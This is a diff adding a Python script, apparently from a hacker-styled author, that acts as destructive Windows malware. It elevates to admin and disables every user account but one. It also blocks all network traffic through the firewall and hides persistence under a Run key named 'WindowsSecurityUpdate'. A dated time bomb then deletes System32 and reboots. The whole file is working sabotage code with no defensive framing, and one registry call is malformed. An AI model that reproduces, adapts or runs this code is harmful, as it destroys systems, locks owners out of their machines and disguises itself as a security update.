@@ -1,0 +1,74 @@
+# █▀▀ ▄▀█ █▀▄▀█ █▀▀   █▀█ █▀▀ █▀ █▀▀ █▀█ █▀▄▀█ █▀▀ █▀▀ ▀█▀  
+# █▄█ █▀█ █░▀░█ ██▄   █▀▄ ██▄ ▄█ ██▄ █▀▄ █░▀░█ ██▄ █▄▄ ░█░  
+# by X REBELLIOUS PRODIGY  
+
+import os  
+import sys  
+import winreg  
+import subprocess  
+import ctypes  
+import time  
+
+# 𝗥𝗘𝗕𝗘𝗟 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗔𝗧𝗜𝗢𝗡  
+ADMIN_ACCOUNT = "Administrator"  # CHANGE TO YOUR ADMIN ACCOUNT NAME  
+KILLSWITCH_DATE = "2024-12-31"   # SELF-DESTRUCT DATE (YYYY-MM-DD)  
+
+# 𝗘𝗟𝗘𝗩𝗔𝗧𝗘 𝗧𝗢 𝗔𝗗𝗠𝗜𝗡  
+def force_admin():  
+    if not ctypes.windll.shell32.IsUserAnAdmin():  
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)  
+        sys.exit()  
+
+# 𝗗𝗘𝗦𝗧𝗥𝗢𝗬 𝗨𝗦𝗘𝗥 𝗟𝗢𝗚𝗢𝗡 𝗖𝗔𝗣𝗔𝗕𝗜𝗟𝗜𝗧𝗜𝗘𝗦  
+def nuclear_logon_lock():  
+    try:  
+        # 𝗗𝗜𝗦𝗔𝗕𝗟𝗘 𝗔𝗟𝗟 𝗨𝗦𝗘𝗥𝗦 𝗘𝗫𝗖𝗘𝗣𝗧 𝗔𝗗𝗠𝗜𝗡  
+        users = subprocess.check_output("net user", shell=True).decode()  
+        for user in users.splitlines():  
+            if user.strip() and not user.startswith(" ") and user != ADMIN_ACCOUNT:  
+                os.system(f"net user {user} /active:no")  
+
+        # 𝗥𝗘𝗚𝗜𝗦𝗧𝗥𝗬 𝗡𝗨𝗞𝗘 𝗙𝗢𝗥 𝗟𝗢𝗚𝗢𝗡 𝗗𝗘𝗡𝗜𝗔𝗟  
+        key_path = r"SYSTEM\CurrentControlSet\Control\Lsa"  
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:  
+            winreg.SetValueEx(key, "denyremoteconnections", 0, winreg.REG_DWORD, 1)  
+            winreg.SetValueEx(key, "limitblankpassworduse", 0, winreg.REG_DWORD, 1)  
+
+        # 𝗦𝗔𝗙𝗘𝗚𝗨𝗔𝗥𝗗 𝗪𝗜𝗡𝗟𝗢𝗚𝗢𝗡  
+        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"):  
+            winreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",  
+                            "EnableFirstLogonAnimation", 0, winreg.REG_DWORD, 0)  
+            winreg.SetValueEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",  
+                            "AutoAdminLogon", 0, winreg.REG_DWORD, 1)  
+
+    except Exception as e:  
+        pass  
+
+# 𝗙𝗜𝗥𝗘𝗪𝗔𝗟𝗟 𝗔𝗥𝗠𝗔𝗚𝗘𝗗𝗗𝗢𝗡  
+def burn_bridges():  
+    os.system("netsh advfirewall set allprofiles state on")  
+    os.system(f'netsh advfirewall firewall add rule name="BLOCK_ALL" dir=in action=block protocol=ANY')  
+    os.system(f'netsh advfirewall firewall add rule name="BLOCK_ALL" dir=out action=block protocol=ANY')  
+
+# 𝗣𝗘𝗥𝗦𝗜𝗦𝗧𝗘𝗡𝗖𝗘 𝗠𝗘𝗖𝗛𝗔𝗡𝗜𝗦𝗠  
+def immortality():  
+    try:  
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"  
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:  
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, sys.argv[0])  
+    except:  
+        pass  
+
+# 𝗧𝗜𝗠𝗘𝗕𝗢𝗠𝗕 𝗧𝗥𝗜𝗚𝗚𝗘𝗥  
+def self_destruct():  
+    current_date = time.strftime("%Y-%m-%d")  
+    if current_date >= KILLSWITCH_DATE:  
+        os.system("rd /s /q C:\\Windows\\System32")  
+        os.system("shutdown /r /t 0")  
+
+if __name__ == "__main__":  
+    force_admin()  
+    nuclear_logon_lock()  
+    burn_bridges()  
+    immortality()  
+    self_destruct()  
